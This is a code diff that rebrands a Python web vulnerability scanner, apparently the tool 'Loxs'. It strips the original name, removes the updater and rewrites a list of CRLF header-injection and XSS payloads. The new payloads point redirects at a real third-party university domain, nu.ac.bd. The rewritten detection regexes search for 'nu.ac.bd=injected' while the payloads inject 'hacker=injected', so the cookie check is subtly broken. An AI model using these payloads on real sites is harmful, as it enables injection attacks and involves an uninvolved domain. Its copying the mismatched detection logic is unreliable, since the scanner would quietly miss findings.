@@ -20,10 +20,6 @@ try:
     import os
     import sys
     import requests
-    from git import Repo
-    import yaml
-    import shutil
-    from flask import session
     from concurrent.futures import Executor
     import urllib
     import signal
@@ -76,7 +72,6 @@ try:
     from rich.console import Console
     from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
     from functools import partial
-    from packaging import version
     from rich.text import Text
     from queue import Queue
     from threading import Lock
@@ -151,12 +146,12 @@ try:
 
     def display_menu():
         title = r"""
-    ██╗    ██╗██╗  ██╗██╗████████╗███████╗    ██╗  ██╗ █████╗ ████████╗
-    ██║    ██║██║  ██║██║╚══██╔══╝██╔════╝    ██║  ██║██╔══██╗╚══██╔══╝
-    ██║ █╗ ██║███████║██║   ██║   █████╗      ███████║███████║   ██║   
-    ██║███╗██║██╔══██║██║   ██║   ██╔══╝      ██╔══██║██╔══██║   ██║   
-    ╚███╔███╔╝██║  ██║██║   ██║   ███████╗    ██║  ██║██║  ██║   ██║   
-     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
+     ██████╗██╗   ██╗██████╗ ███████╗██████╗     ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
+    ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
+    ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
+    ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
+    ╚██████╗   ██║   ██████╔╝███████╗██║  ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
+    ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
     """
         print(Color.GREEN + Style.BRIGHT + title.center(72))
         print(Fore.WHITE + Style.BRIGHT + "─" * 72)
@@ -213,7 +208,7 @@ try:
         <head>
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Loxs Security Scan Report</title>
+            <title>Personal Security Scan Report</title>
             <style>
                 @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
                 
@@ -564,13 +559,13 @@ try:
                         </line>
                     </g>
 
-                    <!-- LOXS Text -->
+                    <!-- Security Text -->
                     <g transform="translate(150,100)">
-                        <text x="0" y="5" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="url(#textGradient)" text-anchor="middle">LOXS</text>
+                        <text x="0" y="5" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="url(#textGradient)" text-anchor="middle">S</text>
                     </g>
                     </svg>
                 </div>
-                <h1 class="animated-text" data-text="Loxs Security Scan Report">Loxs Security Scan Report</h1>
+                <h1 class="animated-text" data-text="Security Scan Report">Security Scan Report</h1>
                 <div class="summary">
                     <div class="summary-item">
                         <span class="summary-label">Scan Type:</span>
@@ -1906,43 +1901,43 @@ try:
         def generate_payloads(url):
             domain = get_domain(url)
             base_payloads = [
-                "/%%0a0aSet-Cookie:loxs=injected",
-                "/%0aSet-Cookie:loxs=injected;",
-                "/%0aSet-Cookie:loxs=injected",
-                "/%0d%0aLocation: http://loxs.pages.dev",
+                "/%%0a0aSet-Cookie:hacker=injected",
+                "/%0aSet-Cookie:hacker=injected;",
+                "/%0aSet-Cookie:hacker=injected",
+                "/%0d%0aLocation: http://nu.ac.bd",
                 "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
-                "/%0d%0a%0d%0a<script>alert('LOXS')</script>;",
+                "/%0d%0a%0d%0a<script>alert('HACKER')</script>;",
                 "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e",
-                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('LOXS');</script>",
-                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: loxs=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: loxs=injected%0d%0a%0d%0a",
-                "/%0d%0aLocation: loxs.pages.dev",
-                "/%0d%0aSet-Cookie:loxs=injected;",
-                "/%0aSet-Cookie:loxs=injected",
+                "/%0d%0aContent-Type: text/html%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert('HACKER');</script>",
+                "/%0d%0aHost: {{Hostname}}%0d%0aCookie: hacker=injected%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aSet-Cookie: hacker=injected%0d%0a%0d%0a",
+                "/%0d%0aLocation: nu.ac.bd",
+                "/%0d%0aSet-Cookie:hacker=injected;",
+                "/%0aSet-Cookie:hacker=injected",
                 "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
-                "/%23%0aSet-Cookie:loxs=injected",
-                "/%25%30%61Set-Cookie:loxs=injected",
-                "/%2e%2e%2f%0d%0aSet-Cookie:loxs=injected",
+                "/%23%0aSet-Cookie:hacker=injected",
+                "/%25%30%61Set-Cookie:hacker=injected",
+                "/%2e%2e%2f%0d%0aSet-Cookie:hacker=injected",
                 "/%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a<script>alert(document.cookie)</script>%2F../%2F..%2F..%2F..%2F../tr",
-                "/%3f%0d%0aLocation:%0d%0aloxs-x:loxs-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
-                "/%5Cr%20Set-Cookie:loxs=injected;",
-                "/%5Cr%5Cn%20Set-Cookie:loxs=injected;",
-                "/%5Cr%5Cn%5CtSet-Cookie:loxs%5Cr%5CtSet-Cookie:loxs=injected;",
-                "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:loxs=injected;",
-                "/%E5%98%8A%E5%98%8DLocation:loxs.pages.dev",
-                "/%E5%98%8D%E5%98%8ALocation:loxs.pages.dev",
-                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
-                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected;",
-                "/%E5%98%8D%E5%98%8ASet-Cookie:loxs=injected",
-                "/%u000ASet-Cookie:loxs=injected;",
-                "/loxs.pages.dev/%2E%2E%2F%0D%0Aloxs-x:loxs-x",
-                "/loxs.pages.dev/%2F..%0D%0Aloxs-x:loxs-x"
+                "/%3f%0d%0aLocation:%0d%0ahacker-x:hacker-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
+                "/%5Cr%20Set-Cookie:hacker=injected;",
+                "/%5Cr%5Cn%20Set-Cookie:hacker=injected;",
+                "/%5Cr%5Cn%5CtSet-Cookie:hacker%5Cr%5CtSet-Cookie:hacker=injected;",
+                "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:hacker=injected;",
+                "/%E5%98%8A%E5%98%8DLocation:nu.ac.bd",
+                "/%E5%98%8D%E5%98%8ALocation:nu.ac.bd",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:hacker=injected",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:hacker=injected;",
+                "/%E5%98%8D%E5%98%8ASet-Cookie:hacker=injected",
+                "/%u000ASet-Cookie:hacker=injected;",
+                "/nu.ac.bd/%2E%2E%2F%0D%0Ahacker-x:hacker-x",
+                "/nu.ac.bd/%2F..%0D%0Ahacker-x:hacker-x"
             ]
             
             return [payload.replace('{{Hostname}}', domain) for payload in base_payloads]
 
         REGEX_PATTERNS = [
-            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)))',
-            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)loxs\.pages\.dev\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?loxs=injected(?:\s*?)(?:$|;)|loxs-x))'
+            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)nu\.ac\.bd\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?nu\.ac\.bd=injected(?:\s*?)(?:$|;)))',
+            r'(?m)^(?:Location\s*?:\s*(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)nu\.ac\.bd\/?(\/|[^.].*)?$|(?:Set-Cookie\s*?:\s*(?:\s*?|.*?;\s*)?nu\.ac\.bd=injected(?:\s*?)(?:$|;)|nu\.ac\.bd-x))'
         ]
 
         def get_random_user_agent():
@@ -2149,124 +2144,6 @@ try:
         print(Fore.RED + "\nExiting...")
         exit()
         
-        
-    
-    def run_update():
-        console = Console()
-        def display_update_intro():
-            panel = Panel(
-                r"""
-██    ██ ███████ ███████  ███████ ████████ ███████ 
-██    ██ ██   ██ ██    ██ ██   ██    ██    ██      
-██    ██ ███████ ██    ██ ███████    ██    █████   
-██    ██ ██      ██    ██ ██   ██    ██    ██      
-████████ ██      ███████  ██   ██    ██    ███████ 
-        """,
-                title="LOXS UPDATER",
-                expand=False,
-                border_style="blue",
-                style="bold green",
-            )
-            console.print(panel)
-            console.print("[cyan] Welcome to the loxs updater![/cyan]\n")
-
-        def get_latest_release(repo_owner, repo_name):
-            url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/releases/latest"
-            try:
-                response = requests.get(url)
-                response.raise_for_status()
-                release_data = response.json()
-                return release_data['tag_name'], release_data
-            except requests.exceptions.RequestException as e:
-                console.print(f"[red][!] Error fetching release information: {e}[/red]")
-                return None, None
-
-        def get_current_version():
-            try:
-                with open(__file__, 'r') as file:
-                    for line in file:
-                        if line.startswith('VERSION ='):
-                            return line.split('=')[1].strip().strip("'\"")
-            except IOError as e:
-                console.print(f"[red][!] Error reading current version: {e}[/red]")
-            return None
-
-        def download_update(download_url, file_path):
-            try:
-                with progress() as progress:
-                    task = progress.add_task("[cyan]Downloading update...", total=100)
-                    response = requests.get(download_url, stream=True)
-                    response.raise_for_status()
-                    total_size = int(response.headers.get('content-length', 0))
-                    block_size = 1024
-                    with open(file_path, 'wb') as file:
-                        for data in response.iter_content(block_size):
-                            size = file.write(data)
-                            progress.update(task, advance=(size/total_size)*100)
-                console.print("[green][✓] Update downloaded successfully.[/green]")
-                return True
-            except requests.exceptions.RequestException as e:
-                console.print(f"[red][!] Error downloading update: {e}[/red]")
-                return False
-
-        def normalize_version(v):
-            # Remove 'v' prefix if present
-            # v = v.lstrip('v')
-
-            # Three components (major.minor.patch)
-            parts = v.split('.')
-            while len(parts) < 3:
-                parts.append('0')
-            return '.'.join(parts)
-
-        display_update_intro()
-
-        repo_owner = "GROK 4"
-        repo_name = "vulnerality-scanner"
-        current_version = get_current_version()
-
-        if current_version is None:
-            console.print("[yellow][!] Unable to find current version.[/yellow]")
-            input("\nPress Enter to return to the main menu...")
-            return
-
-        console.print(f"[cyan][i] Current version: {current_version}[/cyan]")
-        console.print("[cyan][i] Checking for updates...[/cyan]")
-
-        latest_version, release_data = get_latest_release(repo_owner, repo_name)
-
-        if latest_version is None:
-            console.print("[yellow][!] Unable to check for updates.[/yellow]")
-            input("\nPress Enter to return to the main menu...")
-            return
-
-        current_v = version.parse(normalize_version(current_version))
-        latest_v = version.parse(normalize_version(latest_version))
-
-        if latest_v > current_v:
-            console.print(f"[green][✓] New version available: {latest_version}[/green]")
-            update_choice = console.input("[cyan][?] Do you want to update? (y/n): [/cyan]").lower().strip()
-            
-            if update_choice == 'y':
-                try:
-                    download_url = release_data['assets'][0]['browser_download_url']
-                    
-                    if download_update(download_url, __file__):
-                        console.print("[green][✓] Update completed. Please restart loxs..!![/green]")
-                    else:
-                        console.print("[red][!] Update failed.[/red]")
-                except (KeyError, IndexError) as e:
-                    console.print(f"[red][!] Error fetching release assets: {e}[/red]")
-            else:
-                console.print("[yellow][i] Update cancelled.[/yellow]")
-        else:
-            console.print("[green][✓] You are already using the latest version.[/green]")
-            console.print(f"[cyan][i] Current version: {current_version}[/cyan]")
-            console.print(f"[cyan][i] Latest version: {latest_version}[/cyan]")
-
-        input("\nPress Enter to return to the main menu...")
-
-
     def handle_selection(selection):
         
         if selection == '1':
@@ -2291,11 +2168,6 @@ try:
 
         elif selection == '6':
             clear_screen()
-            run_update()
-            clear_screen()
-
-        elif selection == '7':
-            clear_screen()
             print_exit_menu()
 
         else:
@@ -2311,7 +2183,7 @@ try:
         while scan_running:
             try:
                 display_menu()
-                choice = input(f"\n{Fore.CYAN}[?] Select an option (0-7): {Style.RESET_ALL}").strip()
+                choice = input(f"\n{Fore.CYAN}[?] Select an option (0-6): {Style.RESET_ALL}").strip()
                 handle_selection(choice)
             except KeyboardInterrupt:
                 print_exit_menu()
